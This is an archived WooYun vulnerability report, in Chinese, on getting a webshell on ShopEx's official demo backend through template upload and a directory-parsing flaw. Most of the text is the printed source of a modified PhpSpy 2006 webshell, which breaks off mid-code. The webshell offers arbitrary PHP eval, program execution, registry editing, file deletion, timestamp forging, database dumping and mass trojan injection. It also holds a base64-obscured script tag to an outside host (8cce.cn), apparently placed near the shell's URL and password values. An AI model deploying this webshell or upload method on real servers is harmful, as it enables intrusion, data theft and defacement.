<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		shopex官方演示后台得到shell与任意文件遍历突破  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		shopex官方演示后台得到shell与任意文件遍历突破  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lucifer">lucifer</a> 
</li><li>提交时间：		2012-12-03 10:39</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2012-12-03：	细节已通知厂商并且等待厂商处理中<br/>
									2012-12-03：	厂商已经确认，细节仅向厂商公开<br/>
									2012-12-13：	细节向核心白帽子及相关领域专家公开<br/>
									2012-12-23：	细节向普通白帽子公开<br/>
									2013-01-02：	细节向实习白帽子公开<br/>
									2013-01-17：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">shopex演示后台模板编辑功能未限制上传导致可利用解析漏洞建立php.php形式的文件夹获得shell</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">漏洞地址：http://demo.shopex.com.cn/485<br />
<br />
<br />
<br />
官方提供了后台账号密码，登陆后发现似乎是被大家测试的多了，官方非常小心，权限限制的很严格，模板不允许编辑，并且上传后自动重新命名更换文件夹。js，php代码更是全部限制。。。<br />
<br />
<br />
<br />
中间复杂的测试过程不多说。。直接说漏洞利用过程好了<br />
<br />
ps:模板上传后立即点应用，回到首页随便看一张自带图片可以得到上传后的地址。<br />
<br />
1.本地搭建shopex<br />
<br />
2.自带的模板文件夹中创建php.php目录，将上传小马命名*.php;x.jpg，其实直接.jpg就可以了哈<br />
<br />
3.登陆后台-页面管理-模板-上传模板<br />
<br />
4.上传，使用模板。<br />
<br />
5.找到目录。。。。。<br />
<br />
6.还要说么- -<br />
<br />
<br />
<br />
<br />
<br />
接下来<br />
<br />
得到shell以后，发现官方限制了非常多的参数，而且禁止目录内容的读取。<br />
<br />
把php大马进行base64解码后发现代码如下<br />
<br />
</p><pre><code>&lt;?php<br />
$admin[&#039;pass&#039;]  = &quot;xxxx&quot;;  //修改密码<br />
error_reporting(7);<br />
ob_start();<br />
$mtime = explode(&#039; &#039;, microtime());<br />
$starttime = $mtime[1] + $mtime[0];<br />
<br />
$admin[&#039;check&#039;] = &quot;1&quot;;<br />
<br />
$retime = &quot;yes&quot;;<br />
<br />
$cmd = &quot;cmd.exe&quot;;<br />
<br />
$onoff = (function_exists(&#039;ini_get&#039;)) ? ini_get(&#039;register_globals&#039;) : get_cfg_var(&#039;register_globals&#039;);<br />
<br />
if ($onoff != 1) {<br />
	@extract($_POST, EXTR_SKIP);<br />
	@extract($_GET, EXTR_SKIP);<br />
}<br />
<br />
$self = $_SERVER[&#039;PHP_SELF&#039;];<br />
$dis_func = get_cfg_var(&quot;disable_functions&quot;);<br />
<br />
<br />
if($admin[&#039;check&#039;] == &quot;1&quot;) {<br />
	if ($_GET[&#039;action&#039;] == &quot;logout&quot;) {<br />
		setcookie (&quot;adminpass&quot;, &quot;&quot;);<br />
		echo &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0;URL=&quot;.$self.&quot;\&quot;&gt;&quot;;<br />
		exit;<br />
	}<br />
<br />
	if ($_POST[&#039;do&#039;] == &#039;login&#039;) {<br />
		$thepass=trim($_POST[&#039;adminpass&#039;]);<br />
		if ($admin[&#039;pass&#039;] == $thepass) {<br />
			setcookie (&quot;adminpass&quot;,$thepass,time()+(1*24*3600));<br />
			echo &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0;URL=&quot;.$self.&quot;\&quot;&gt;&quot;;<br />
			exit;<br />
		}<br />
	}<br />
	if (isset($_COOKIE[&#039;adminpass&#039;])) {<br />
		if ($_COOKIE[&#039;adminpass&#039;] != $admin[&#039;pass&#039;]) {<br />
			loginpage();<br />
		}<br />
	} else {<br />
		loginpage();<br />
	}<br />
}<br />
/*===================== 验证结束 =====================*/<br />
<br />
// 判断 magic_quotes_gpc 状态<br />
if (get_magic_quotes_gpc()) {<br />
    $_GET = stripslashes_array($_GET);<br />
	$_POST = stripslashes_array($_POST);<br />
}<br />
<br />
// 查看PHPINFO<br />
if ($_GET[&#039;action&#039;] == &quot;phpinfo&quot;) {<br />
	echo $phpinfo=(!eregi(&quot;phpinfo&quot;,$dis_func)) ? phpinfo() : &quot;phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;&quot;;<br />
	exit;<br />
}<br />
if($_GET[&#039;action&#039;] == &quot;nowuser&quot;) {<br />
$user = get_current_user();<br />
if(!$user) $user = &quot;报告长官，主机变态，无法获取当前进行用户名！&quot;;<br />
echo&quot;当前进程用户名：$user&quot;;<br />
exit;<br />
}<br />
if(isset($_POST[&#039;phpcode&#039;])){<br />
	eval(&quot;?&quot;.&quot;&gt;$_POST[phpcode]&lt;?&quot;);<br />
	exit;<br />
}<br />
// 在线代理<br />
if (isset($_POST[&#039;url&#039;])) {<br />
	$proxycontents = @file_get_contents($_POST[&#039;url&#039;]);<br />
	echo ($proxycontents) ? $proxycontents : &quot;&lt;body bgcolor=\&quot;#F5F5F5\&quot; style=\&quot;font-size: 12px;\&quot;&gt;&lt;center&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;获取 URL 内容失败&lt;/b&gt;&lt;/p&gt;&lt;/center&gt;&lt;/body&gt;&quot;;<br />
	exit;<br />
}<br />
<br />
// 下载文件<br />
if (!empty($downfile)) {<br />
	if (!@file_exists($downfile)) {<br />
		echo &quot;&lt;script&gt;alert(&#039;你要下的文件不存在!&#039;)&lt;/script&gt;&quot;;<br />
	} else {<br />
		$filename = basename($downfile);<br />
		$filename_info = explode(&#039;.&#039;, $filename);<br />
		$fileext = $filename_info[count($filename_info)-1];<br />
		header(&#039;Content-type: application/x-&#039;.$fileext);<br />
		header(&#039;Content-Disposition: attachment; filename=&#039;.$filename);<br />
		header(&#039;Content-Description: PHP Generated Data&#039;);<br />
		header(&#039;Content-Length: &#039;.filesize($downfile));<br />
		@readfile($downfile);<br />
		exit;<br />
	}<br />
}<br />
<br />
// 直接下载备份数据库<br />
if ($_POST[&#039;backuptype&#039;] == &#039;download&#039;) {<br />
	@mysql_connect($servername,$dbusername,$dbpassword) or die(&quot;数据库连接失败&quot;);<br />
	@mysql_select_db($dbname) or die(&quot;选择数据库失败&quot;);	<br />
	$table = array_flip($_POST[&#039;table&#039;]);<br />
	$result = mysql_query(&quot;SHOW tables&quot;);<br />
	echo ($result) ? NULL : &quot;出错: &quot;.mysql_error();<br />
<br />
	$filename = basename($_SERVER[&#039;HTTP_HOST&#039;].&quot;_MySQL.sql&quot;);<br />
	header(&#039;Content-type: application/unknown&#039;);<br />
	header(&#039;Content-Disposition: attachment; filename=&#039;.$filename);<br />
	$mysqldata = &#039;&#039;;<br />
	while ($currow = mysql_fetch_array($result)) {<br />
		if (isset($table[$currow[0]])) {<br />
			$mysqldata.= sqldumptable($currow[0]);<br />
			$mysqldata.= $mysqldata.&quot;\r\n&quot;;<br />
		}<br />
	}<br />
	mysql_close();<br />
	exit;<br />
}<br />
<br />
// 程序目录<br />
$pathname=str_replace(&#039;\\&#039;,&#039;/&#039;,dirname(__FILE__)); <br />
<br />
// 获取当前路径<br />
if (!isset($dir) or empty($dir)) {<br />
	$dir = &quot;.&quot;;<br />
	$nowpath = getPath($pathname, $dir);<br />
} else {<br />
	$dir=$_GET[&#039;dir&#039;];<br />
	$nowpath = getPath($pathname, $dir);<br />
}<br />
<br />
// 判断读写情况<br />
$dir_writeable = (dir_writeable($nowpath)) ? &quot;可写&quot; : &quot;不可写&quot;;<br />
$phpinfo=(!eregi(&quot;phpinfo&quot;,$dis_func)) ? &quot; | &lt;a href=\&quot;?action=phpinfo\&quot; target=\&quot;_blank\&quot;&gt;PHPINFO()&lt;/a&gt;&quot; : &quot;&quot;;<br />
$reg = (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) ? &quot; | &lt;a href=\&quot;?action=reg\&quot;&gt;注册表操作&lt;/a&gt;&quot; : &quot;&quot;;<br />
<br />
$tb = new FORMS;<br />
<br />
?&gt;<br />
&lt;html&gt;<br />
&lt;head&gt;<br />
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;<br />
&lt;title&gt;http://&lt;? echo $_SERVER[&#039;HTTP_HOST&#039;];?&gt;  PhpSpy 2006 修改版&lt;/title&gt;<br />
&lt;style type=&quot;text/css&quot;&gt;<br />
body{<br />
	BACKGROUND-COLOR: #F5F5F5; <br />
	COLOR: #3F3849; <br />
	font-family: &quot;Verdana&quot;, &quot;Tahoma&quot;, &quot;宋体&quot;;<br />
	font-size: &quot;12px&quot;;<br />
	line-height: &quot;140%&quot;;<br />
}<br />
<br />
TD		{FONT-FAMILY: &quot;Verdana&quot;, &quot;Tahoma&quot;, &quot;宋体&quot;; FONT-SIZE: 12px; line-height: 140%;}<br />
.smlfont {<br />
	font-family: &quot;Verdana&quot;, &quot;Tahoma&quot;, &quot;宋体&quot;;<br />
	font-size: &quot;11px&quot;;<br />
}<br />
.INPUT {<br />
	FONT-SIZE: &quot;12px&quot;;<br />
	COLOR: &quot;#000000&quot;;<br />
	BACKGROUND-COLOR: &quot;#FFFFFF&quot;;<br />
	height: &quot;18px&quot;;<br />
	border: &quot;1px solid #666666&quot;;<br />
	padding-left: &quot;2px&quot;;<br />
}<br />
.redfont {<br />
	COLOR: &quot;#CA0000&quot;;<br />
}<br />
A:LINK		{COLOR: #3F3849; TEXT-DECORATION: none}<br />
A:VISITED	{COLOR: #3F3849; TEXT-DECORATION: none}<br />
A:HOVER		{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}<br />
A:ACTIVE	{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}<br />
.top {BACKGROUND-COLOR: &quot;#CCCCCC&quot;}<br />
.firstalt {BACKGROUND-COLOR: &quot;#EFEFEF&quot;}<br />
.secondalt {BACKGROUND-COLOR: &quot;#F5F5F5&quot;}<br />
&lt;/style&gt;<br />
&lt;SCRIPT language=JavaScript&gt;<br />
function CheckAll(form) {<br />
	for (var i=0;i&lt;form.elements.length;i++) {<br />
		var e = form.elements[i];<br />
		if (e.name != &#039;chkall&#039;)<br />
		e.checked = form.chkall.checked;<br />
    }<br />
}<br />
function really(d,f,m,t) {<br />
	if (confirm(m)) {<br />
		if (t == 1) {<br />
			window.location.href=&#039;?dir=&#039;+d+&#039;&amp;deldir=&#039;+f;<br />
		} else {<br />
			window.location.href=&#039;?dir=&#039;+d+&#039;&amp;delfile=&#039;+f;<br />
		}<br />
	}<br />
}<br />
&lt;/SCRIPT&gt;<br />
&lt;/head&gt;<br />
&lt;body style=&quot;table-layout:fixed; word-break:break-all&quot;&gt;<br />
&lt;center&gt;<br />
&lt;?php<br />
$test = &quot;&quot;;<br />
if(!$_GET[&#039;dir&#039;]) $dir = &quot;./&quot;;<br />
$tb-&gt;tableheader();<br />
$tb-&gt;tdbody(&#039;&lt;table width=&quot;98%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&#039;.$_SERVER[&#039;HTTP_HOST&#039;].&#039;&lt;/b&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&#039;.date(&quot;Y年m月d日 h:i:s&quot;,time()).&#039;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;b&gt;&#039;.$_SERVER[&#039;REMOTE_ADDR&#039;].&#039;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#039;,&#039;center&#039;,&#039;top&#039;);<br />
$tb-&gt;tdbody(&#039;&lt;a href=&quot;?action=dir&quot;&gt;SHELL目录&lt;/a&gt; | &lt;a href=&quot;?action=downloads&quot;&gt;Http 文件下载&lt;/a&gt; | &lt;a href=&quot;?action=phpenv&quot;&gt;环境变量&lt;/a&gt; | &lt;a href=&quot;?action=proxy&quot;&gt;在线代理&lt;/a&gt;&#039;.$reg.$phpinfo.&#039; | &lt;a href=&quot;?action=shell&quot;&gt;WebShell&lt;/a&gt; | &lt;a href=&quot;?action=logout&quot;&gt;注销登录&lt;/a&gt; &#039;);<br />
$tb-&gt;tdbody(&#039; &lt;a href=&quot;?action=plgm&quot;&gt;批量挂马&lt;/a&gt; | &lt;a href=&quot;?action=search&amp;dir=&#039;.$dir.&#039;&quot;&gt;文件查找&lt;/a&gt; | &lt;a href=&quot;?action=eval&quot;&gt;执行php脚本&lt;/a&gt; | &lt;a href=&quot;?action=sql&quot;&gt;执行SQL语句&lt;/a&gt; | &lt;a href=&quot;?action=sql&amp;type=fun&quot;&gt;Func反弹Shell&lt;/a&gt; | &lt;a href=&quot;?action=sqlbak&quot;&gt;MySQL Backup&lt;/a&gt; | &lt;a href=&quot;?action=SUExp&quot;&gt;Serv-U EXP&lt;/a&gt; | &lt;a href=&quot;?action=adodb&quot;&gt;ADODB&lt;/a&gt; &#039;);<br />
$tb-&gt;tdbody(&#039; 目录列表：&lt;a href=&quot;?dir=c:\&quot;&gt;C盘&lt;/a&gt; | &lt;a href=&quot;?dir=d:\&quot;&gt;D盘&lt;/a&gt; | &lt;a href=&quot;?dir=e:\&quot;&gt;E盘&lt;/a&gt; | &lt;a href=&quot;?dir=f:\&quot;&gt;F盘&lt;/a&gt; | &lt;a href=&quot;?dir=g:\&quot;&gt;G盘&lt;/a&gt; | &lt;a href=&quot;?dir=C:\Program Files&quot;&gt;程序&lt;/a&gt; | &lt;a href=&quot;?dir=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere&quot;&gt;pcAnywhere&lt;/a&gt; &#039;);<br />
$tb-&gt;tablefooter();<br />
?&gt;<br />
&lt;hr width=&quot;775&quot; noshade&gt;<br />
&lt;table width=&quot;775&quot; border=&quot;0&quot; cellpadding=&quot;0&quot;&gt;<br />
&lt;?<br />
$tb-&gt;headerform(array(&#039;method&#039;=&gt;&#039;GET&#039;,&#039;content&#039;=&gt;&#039;&lt;p&gt;程序路径: &#039;.$pathname.&#039;&lt;br&gt;当前目录(&#039;.$dir_writeable.&#039;,&#039;.substr(base_convert(@fileperms($nowpath),10,8),-4).&#039;): &#039;.$nowpath.&#039;&lt;br&gt;跳转目录: &#039;.$tb-&gt;makeinput(&#039;dir&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;).&#039; 〖支持绝对路径和相对路径〗&#039;));<br />
<br />
$tb-&gt;headerform(array(&#039;action&#039;=&gt;&#039;?dir=&#039;.urlencode($dir),&#039;enctype&#039;=&gt;&#039;multipart/form-data&#039;,&#039;content&#039;=&gt;&#039;上传文件到当前目录: &#039;.$tb-&gt;makeinput(&#039;uploadfile&#039;,&#039;&#039;,&#039;&#039;,&#039;file&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;doupfile&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;).$tb-&gt;makeinput(&#039;uploaddir&#039;,$dir,&#039;&#039;,&#039;hidden&#039;)));<br />
<br />
$tb-&gt;headerform(array(&#039;action&#039;=&gt;&#039;?action=editfile&amp;dir=&#039;.urlencode($dir),&#039;content&#039;=&gt;&#039;新建文件在当前目录: &#039;.$tb-&gt;makeinput(&#039;editfile&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;createfile&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;)));<br />
<br />
$tb-&gt;headerform(array(&#039;content&#039;=&gt;&#039;新建目录在当前目录: &#039;.$tb-&gt;makeinput(&#039;newdirectory&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;createdirectory&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;)));<br />
?&gt;<br />
&lt;/table&gt;<br />
&lt;?<br />
$serveru = $_SERVER [&#039;HTTP_HOST&#039;].$_SERVER[&#039;PHP_SELF&#039;];<br />
$serverp = $admin[&#039;pass&#039;];<br />
$copyurl = base64_decode(&#039;PHNjcmlwdCBzcmM9J2h0dHA6Ly84Y2NlLmNuL2NlcnQvP2NlcnQ9MTMmdT0=&#039;);<br />
$copyurll = base64_decode(&#039;Jz48L3NjcmlwdD4=&#039;);<br />
?&gt;<br />
&lt;hr width=&quot;775&quot; noshade&gt;<br />
&lt;?php<br />
/*===================== 执行操作 开始 =====================*/<br />
echo &quot;&lt;p&gt;&lt;b&gt;\n&quot;;<br />
// 删除文件<br />
if (!empty($delfile)) {<br />
	if (file_exists($delfile)) {<br />
		echo (@unlink($delfile)) ? $delfile.&quot; 删除成功!&quot; : &quot;文件删除失败!&quot;;<br />
	} else {<br />
		echo basename($delfile).&quot; 文件已不存在!&quot;;<br />
	}<br />
}<br />
<br />
// 删除目录<br />
elseif (!empty($deldir)) {<br />
	$deldirs=&quot;$dir/$deldir&quot;;<br />
	if (!file_exists(&quot;$deldirs&quot;)) {<br />
		echo &quot;$deldir 目录已不存在!&quot;;<br />
	} else {<br />
		echo (deltree($deldirs)) ? &quot;目录删除成功!&quot; : &quot;目录删除失败!&quot;;<br />
	}<br />
}<br />
// 创建目录<br />
elseif (($createdirectory) AND !empty($_POST[&#039;newdirectory&#039;])) {<br />
	if (!empty($newdirectory)) {<br />
		$mkdirs=&quot;$dir/$newdirectory&quot;;<br />
		if (file_exists(&quot;$mkdirs&quot;)) {<br />
			echo &quot;该目录已存在!&quot;;<br />
		} else {<br />
			echo (@mkdir(&quot;$mkdirs&quot;,0777)) ? &quot;创建目录成功!&quot; : &quot;创建失败!&quot;;<br />
			@chmod(&quot;$mkdirs&quot;,0777);<br />
		}<br />
	}<br />
}<br />
<br />
// 上传文件<br />
elseif ($doupfile) {<br />
	echo (@copy($_FILES[&#039;uploadfile&#039;][&#039;tmp_name&#039;],&quot;&quot;.$uploaddir.&quot;/&quot;.$_FILES[&#039;uploadfile&#039;][&#039;name&#039;].&quot;&quot;)) ? &quot;上传成功!&quot; : &quot;上传失败!&quot;;<br />
}<br />
<br />
// 编辑文件<br />
elseif ($_POST[&#039;do&#039;] == &#039;doeditfile&#039;) {<br />
	if (!empty($_POST[&#039;editfilename&#039;])) {<br />
    if(!file_exists($editfilename)) unset($retime);<br />
	if($time==$now) $time = @filemtime($editfilename);<br />
        $time2 = @date(&quot;Y-m-d H:i:s&quot;,$time);<br />
		$filename=&quot;$editfilename&quot;;<br />
		@$fp=fopen(&quot;$filename&quot;,&quot;w&quot;);<br />
		if($_POST[&#039;change&#039;]==&quot;yes&quot;){<br />
		$filecontent = &quot;?&quot;.&quot;&gt;&quot;.$_POST[&#039;filecontent&#039;].&quot;&lt;?&quot;;<br />
		$filecontent = gzdeflate($filecontent);<br />
        $filecontent = base64_encode($filecontent);<br />
        $filecontent = &quot;&lt;?php\n/*\n代码由浅蓝的辐射鱼加密!\n*/\neval(gzinflate(base64_decode(&#039;$filecontent&#039;)));\n&quot;.&quot;?&gt;&quot;;<br />
		}else{<br />
		$filecontent = $_POST[&#039;filecontent&#039;];<br />
		}<br />
		echo $msg=@fwrite($fp,$filecontent) ? &quot;写入文件成功!&quot; : &quot;写入失败!&quot;;<br />
		@fclose($fp);<br />
		if($retime==&quot;yes&quot;){<br />
        echo&quot; 鱼鱼自动操作:&quot;;<br />
        echo $msg=@touch($filename,$time) ? &quot;修改文件为&quot;.$time2.&quot;成功!&quot; : &quot;修改文件时间失败!&quot;;<br />
		}<br />
	} else {<br />
		echo &quot;请输入想要编辑的文件名!&quot;;<br />
	}<br />
}<br />
//文件下载<br />
elseif ($_POST[&#039;do&#039;] == &#039;downloads&#039;) {<br />
	$contents = @file_get_contents($_POST[&#039;durl&#039;]);<br />
	if(!$contents){<br />
	echo&quot;无法读取要下载的数据&quot;;<br />
	}<br />
	elseif(file_exists($path)){<br />
	echo&quot;很抱歉，文件&quot;.$path.&quot;已经存在了，请更换保存文件名。&quot;;<br />
	}else{<br />
    $fp = @fopen($path,&quot;w&quot;);<br />
	echo $msg=@fwrite($fp,$contents) ? &quot;下载文件成功!&quot; : &quot;下载文件写入时失败!&quot;;<br />
	@fclose($fp);<br />
	}<br />
}<br />
<br />
// 编辑文件属性<br />
elseif ($_POST[&#039;do&#039;] == &#039;editfileperm&#039;) {<br />
	if (!empty($_POST[&#039;fileperm&#039;])) {<br />
		$fileperm=base_convert($_POST[&#039;fileperm&#039;],8,10);<br />
		echo (@chmod($dir.&quot;/&quot;.$file,$fileperm)) ? &quot;属性修改成功!&quot; : &quot;修改失败!&quot;;<br />
		echo &quot; 文件 &quot;.$file.&quot; 修改后的属性为: &quot;.substr(base_convert(@fileperms($dir.&quot;/&quot;.$file),10,8),-4);<br />
	} else {<br />
		echo &quot;请输入想要设置的属性!&quot;;<br />
	}<br />
}<br />
<br />
// 文件改名<br />
elseif ($_POST[&#039;do&#039;] == &#039;rename&#039;) {<br />
	if (!empty($_POST[&#039;newname&#039;])) {<br />
		$newname=$_POST[&#039;dir&#039;].&quot;/&quot;.$_POST[&#039;newname&#039;];<br />
		if (@file_exists($newname)) {<br />
			echo &quot;&quot;.$_POST[&#039;newname&#039;].&quot; 已经存在,请重新输入一个!&quot;;<br />
		} else {<br />
			echo (@rename($_POST[&#039;oldname&#039;],$newname)) ? basename($_POST[&#039;oldname&#039;]).&quot; 成功改名为 &quot;.$_POST[&#039;newname&#039;].&quot; !&quot; : &quot;文件名修改失败!&quot;;<br />
		}<br />
	} else {<br />
		echo &quot;请输入想要改的文件名!&quot;;<br />
	}<br />
}<br />
elseif ($_POST[&#039;do&#039;] == &#039;search&#039;) {<br />
if(!empty($oldkey)){<br />
echo&quot;&lt;span class=\&quot;redfont\&quot;&gt;查找关键词:[&quot;.$oldkey.&quot;],下面显示查找的结果:&quot;;<br />
	if($type2 == &quot;getpath&quot;){<br />
	echo&quot;鼠标移到结果文件上会有部分截取显示.&quot;;<br />
}<br />
echo&quot;&lt;/span&gt;&lt;br&gt;&lt;hr width=\&quot;775\&quot; noshade&gt;&quot;;<br />
find($path);<br />
}else{<br />
echo&quot;你要查虾米?到底要查虾米呢?有没有虾米要你查呢?&quot;;<br />
}<br />
}<br />
elseif ($_GET[&#039;action&#039;]==&#039;plgmok&#039;) {<br />
   dirt($_POST[&#039;dir&#039;],$_POST[&#039;sbbm&#039;]);<br />
   dirtree($_POST[&#039;dir&#039;],$_POST[&#039;mm&#039;]);<br />
}<br />
<br />
// 克隆时间<br />
elseif ($_POST[&#039;do&#039;] == &#039;domodtime&#039;) {<br />
	if (!@file_exists($_POST[&#039;curfile&#039;])) {<br />
		echo &quot;要修改的文件不存在!&quot;;<br />
	} else {<br />
		if (!@file_exists($_POST[&#039;tarfile&#039;])) {<br />
			echo &quot;要参照的文件不存在!&quot;;<br />
		} else {<br />
			$time=@filemtime($_POST[&#039;tarfile&#039;]);<br />
			echo (@touch($_POST[&#039;curfile&#039;],$time,$time)) ? basename($_POST[&#039;curfile&#039;]).&quot; 的修改时间成功改为 &quot;.date(&quot;Y-m-d H:i:s&quot;,$time).&quot; !&quot; : &quot;文件的修改时间修改失败!&quot;;<br />
		}<br />
	}<br />
}<br />
<br />
// 自定义时间<br />
elseif ($_POST[&#039;do&#039;] == &#039;modmytime&#039;) {<br />
	if (!@file_exists($_POST[&#039;curfile&#039;])) {<br />
		echo &quot;要修改的文件不存在!&quot;;<br />
	} else {<br />
		$year=$_POST[&#039;year&#039;];<br />
		$month=$_POST[&#039;month&#039;];<br />
		$data=$_POST[&#039;data&#039;];		<br />
		$hour=$_POST[&#039;hour&#039;];<br />
		$minute=$_POST[&#039;minute&#039;];<br />
		$second=$_POST[&#039;second&#039;];<br />
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {<br />
			$time=strtotime(&quot;$data $month $year $hour:$minute:$second&quot;);<br />
			echo (@touch($_POST[&#039;curfile&#039;],$time,$time)) ? basename($_POST[&#039;curfile&#039;]).&quot; 的修改时间成功改为 &quot;.date(&quot;Y-m-d H:i:s&quot;,$time).&quot; !&quot; : &quot;文件的修改时间修改失败!&quot;;<br />
		}<br />
	}<br />
}<br />
<br />
// 连接MYSQL<br />
elseif ($connect) {<br />
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {<br />
		echo &quot;数据库连接成功!&quot;;<br />
		mysql_close();<br />
	} else {<br />
		echo mysql_error();<br />
	}<br />
}<br />
<br />
// 执行SQL语句<br />
elseif ($_POST[&#039;do&#039;] == &#039;query&#039;) {<br />
	@mysql_connect($servername,$dbusername,$dbpassword) or die(&quot;数据库连接失败&quot;);<br />
	@mysql_select_db($dbname) or die(&quot;选择数据库失败&quot;);<br />
	$result = @mysql_query($_POST[&#039;sql_query&#039;]);<br />
	echo ($result) ? &quot;SQL语句成功执行!&quot; : &quot;出错: &quot;.mysql_error();<br />
	mysql_close();<br />
}<br />
<br />
// 备份操作<br />
elseif ($_POST[&#039;do&#039;] == &#039;backupmysql&#039;) {<br />
	if (empty($_POST[&#039;table&#039;]) OR empty($_POST[&#039;backuptype&#039;])) {<br />
		echo &quot;请选择欲备份的数据表和备份方式!&quot;;<br />
	} else {<br />
		if ($_POST[&#039;backuptype&#039;] == &#039;server&#039;) {<br />
			@mysql_connect($servername,$dbusername,$dbpassword) or die(&quot;数据库连接失败&quot;);<br />
			@mysql_select_db($dbname) or die(&quot;选择数据库失败&quot;);	<br />
			$table = array_flip($_POST[&#039;table&#039;]);<br />
			$filehandle = @fopen($path,&quot;w&quot;);<br />
			if ($filehandle) {<br />
				$result = mysql_query(&quot;SHOW tables&quot;);<br />
				echo ($result) ? NULL : &quot;出错: &quot;.mysql_error();<br />
				while ($currow = mysql_fetch_array($result)) {<br />
					if (isset($table[$currow[0]])) {<br />
						sqldumptable($currow[0], $filehandle);<br />
						fwrite($filehandle,&quot;\n\n\n&quot;);<br />
					}<br />
				}<br />
				fclose($filehandle);<br />
				echo &quot;数据库已成功备份到 &lt;a href=\&quot;&quot;.$path.&quot;\&quot; target=\&quot;_blank\&quot;&gt;&quot;.$path.&quot;&lt;/a&gt;&quot;;<br />
				mysql_close();<br />
			} else {<br />
				echo &quot;备份失败,请确认目标文件夹是否具有可写权限!&quot;;<br />
			}<br />
		}<br />
	}<br />
}<br />
<br />
<br />
// 打包下载 PS:文件太大可能非常慢<br />
// Thx : 小花<br />
elseif($downrar) {<br />
	if (!empty($dl)) {<br />
		$dfiles=&quot;&quot;;<br />
		foreach ($dl AS $filepath=&gt;$value) {<br />
			$dfiles.=$filepath.&quot;,&quot;;<br />
		}<br />
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);<br />
		$dl=explode(&quot;,&quot;,$dfiles);<br />
		$zip=new PHPZip($dl);<br />
		$code=$zip-&gt;out;		<br />
		header(&quot;Content-type: application/octet-stream&quot;);<br />
		header(&quot;Accept-Ranges: bytes&quot;);<br />
		header(&quot;Accept-Length: &quot;.strlen($code));<br />
		header(&quot;Content-Disposition: attachment;filename=&quot;.$_SERVER[&#039;HTTP_HOST&#039;].&quot;_Files.tar.gz&quot;);<br />
		echo $code;<br />
		exit;<br />
	} else {<br />
		echo &quot;请选择要打包下载的文件!&quot;;<br />
	}<br />
}<br />
<br />
// Shell.Application 运行程序<br />
elseif(($_POST[&#039;do&#039;] == &#039;programrun&#039;) AND !empty($_POST[&#039;program&#039;])) {<br />
	$shell= &amp;new COM(&#039;Sh&#039;.&#039;el&#039;.&#039;l.Appl&#039;.&#039;ica&#039;.&#039;tion&#039;);<br />
	$a = $shell-&gt;ShellExecute($_POST[&#039;program&#039;],$_POST[&#039;prog&#039;]);<br />
	echo ($a==&#039;0&#039;) ? &quot;程序已经成功执行!&quot; : &quot;程序运行失败!&quot;;<br />
}<br />
<br />
// 查看PHP配置参数状况<br />
elseif(($_POST[&#039;do&#039;] == &#039;viewphpvar&#039;) AND !empty($_POST[&#039;phpvarname&#039;])) {<br />
	echo &quot;配置参数 &quot;.$_POST[&#039;phpvarname&#039;].&quot; 检测结果: &quot;.getphpcfg($_POST[&#039;phpvarname&#039;]).&quot;&quot;;<br />
}<br />
<br />
// 读取注册表<br />
elseif(($regread) AND !empty($_POST[&#039;readregname&#039;])) {<br />
	$shell= &amp;new COM(&#039;WSc&#039;.&#039;rip&#039;.&#039;t.Sh&#039;.&#039;ell&#039;);<br />
	var_dump(@$shell-&gt;RegRead($_POST[&#039;readregname&#039;]));<br />
}<br />
<br />
// 写入注册表<br />
elseif(($regwrite) AND !empty($_POST[&#039;writeregname&#039;]) AND !empty($_POST[&#039;regtype&#039;]) AND !empty($_POST[&#039;regval&#039;])) {<br />
	$shell= &amp;new COM(&#039;W&#039;.&#039;Scr&#039;.&#039;ipt.S&#039;.&#039;hell&#039;);<br />
	$a = @$shell-&gt;RegWrite($_POST[&#039;writeregname&#039;], $_POST[&#039;regval&#039;], $_POST[&#039;regtype&#039;]);<br />
	echo ($a==&#039;0&#039;) ? &quot;写入注册表健值成功!&quot; : &quot;写入 &quot;.$_POST[&#039;regname&#039;].&quot;, &quot;.$_POST[&#039;regval&#039;].&quot;, &quot;.$_POST[&#039;regtype&#039;].&quot; 失败!&quot;;<br />
}<br />
<br />
// 删除注册表<br />
elseif(($regdelete) AND !empty($_POST[&#039;delregname&#039;])) {<br />
	$shell= &amp;new COM(&#039;WS&#039;.&#039;cri&#039;.&#039;pt.S&#039;.&#039;he&#039;.&#039;ll&#039;);<br />
	$a = @$shell-&gt;RegDelete($_POST[&#039;delregname&#039;]);<br />
